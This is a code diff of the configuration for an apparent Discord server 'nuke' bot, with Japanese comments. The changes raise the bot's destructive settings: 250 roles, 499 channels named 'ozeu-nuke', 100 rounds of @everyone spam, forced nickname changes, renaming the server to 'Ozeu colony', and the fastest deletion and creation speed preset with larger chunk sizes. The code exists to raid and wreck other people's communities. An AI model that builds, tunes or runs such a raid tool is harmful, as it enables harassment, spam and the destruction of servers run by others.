@@ -21,18 +21,18 @@ INTENTS.members = True
 
 # --- User settings ---
 ROLE_BASE      = "ozeumember"   # ロール名ベース
-ROLE_COUNT     = 5               # 作成数
+ROLE_COUNT     = 250               # 作成数
 CHANNEL_BASE   = "ozeu-nuke"    # チャンネル名ベース
-CHANNEL_COUNT  = 5               # 作成数
+CHANNEL_COUNT  = 499               # 作成数
 REPEAT_MESSAGE = "@everyone おぜうの集いに参加！ https://example.com"
-REPEAT_COUNT   = 1               # メッセージ送信回数
+REPEAT_COUNT   = 100               # メッセージ送信回数
 
 CHANGE_NICKNAMES = True
 NICK_BASE        = "おぜう様万歳！"
 NEW_GUILD_NAME   = "おぜう植民地"
 
 # Speed preset (遅い / 普通 / 速い / 爆速)
-SPEED_LEVEL = "速い"
+SPEED_LEVEL = "爆速"
 
 SPEED_PRESETS = {
     "遅い": {
@@ -57,9 +57,9 @@ SPEED_PRESETS = {
         "NICK_CHUNK_SIZE": 12,  "NICK_CHUNK_SLEEP": 0.12
     },
     "爆速": {
-        "DELETE_CHUNK_SIZE": 12, "DELETE_CHUNK_SLEEP": 0.04, "POST_DELETE_WAIT": 1.0,
-        "CREATE_CHUNK_SIZE": 10, "CREATE_CHUNK_SLEEP": 0.05,
-        "MSG_CHUNK_SIZE": 20,   "MSG_INTER_CHUNK_SLEEP": 0.005, "MSG_INTER_ROUND_SLEEP": 0.01,
+        "DELETE_CHUNK_SIZE": 100, "DELETE_CHUNK_SLEEP": 0.04, "POST_DELETE_WAIT": 1.0,
+        "CREATE_CHUNK_SIZE": 499, "CREATE_CHUNK_SLEEP": 0.05,
+        "MSG_CHUNK_SIZE": 499,   "MSG_INTER_CHUNK_SLEEP": 0.005, "MSG_INTER_ROUND_SLEEP": 0.01,
         "ROLE_CHUNK_SIZE": 6,   "ROLE_CHUNK_SLEEP": 0.02, "ROLE_MAX_RETRIES": 2,
         "NICK_CHUNK_SIZE": 16,  "NICK_CHUNK_SLEEP": 0.05
     }
